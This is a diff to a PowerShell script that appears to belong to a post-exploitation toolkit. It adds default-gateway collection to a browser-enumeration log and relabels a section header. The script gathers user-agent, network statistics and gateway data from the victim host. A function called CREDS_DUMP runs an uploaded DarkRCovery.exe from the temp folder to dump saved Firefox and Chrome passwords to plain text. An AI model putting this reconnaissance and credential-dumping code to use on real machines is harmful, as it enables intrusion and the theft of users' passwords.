@@ -142,6 +142,10 @@ $MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";
 $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object 'User Agent'
 If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''}else{$ParsingIntSet = "UserAgent    : Not Found"}
 
+## Get Default Gateway IpAddress (IPV4)
+$RGateway = (Get-NetIPConfiguration|Foreach IPv4DefaultGateway -ErrorAction SilentlyContinue).NextHop
+If(-not($RGateway) -or $RGateway -eq $null){$RGateway = "{null}"}
+
 ## Internet statistics
 $recstats = netstat -s -p IP|select-string -pattern "Packets Received"
 If($recstats){$statsdata = $recstats -replace '  Packets Received                   =','TCPReceived  :'}else{$statsdata = "TCPReceived  : {null}"}
@@ -166,10 +170,10 @@ If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
 }
 
 echo "$MInvocation" >> $LogFilePath\BrowserEnum.log
+echo "Gateway      : $RGateway" >> $LogFilePath\BrowserEnum.log
 echo "$statsdata" >> $LogFilePath\BrowserEnum.log
 echo "$deliverdata" >> $LogFilePath\BrowserEnum.log
 ## END Off { @args -DEFAULTS }
-
 
 function ConvertFrom-Json20([object] $item){
     ## Json Files Convertion to text
@@ -885,8 +889,8 @@ function CREDS_DUMP {
 
     ## Leak Firefox|Chrome credentials to plain text { EXE Coded By 0xyg3n }
     # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
-    echo "`n`n[ Leak credentials => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-    echo "---------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`n`n[ Leak credentials (plain text) => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
+    echo "----------------------------------------------" >> $LogFilePath\BrowserEnum.log
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
     cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
         If(Test-Path "$env:TMP\Leaked.txt"){
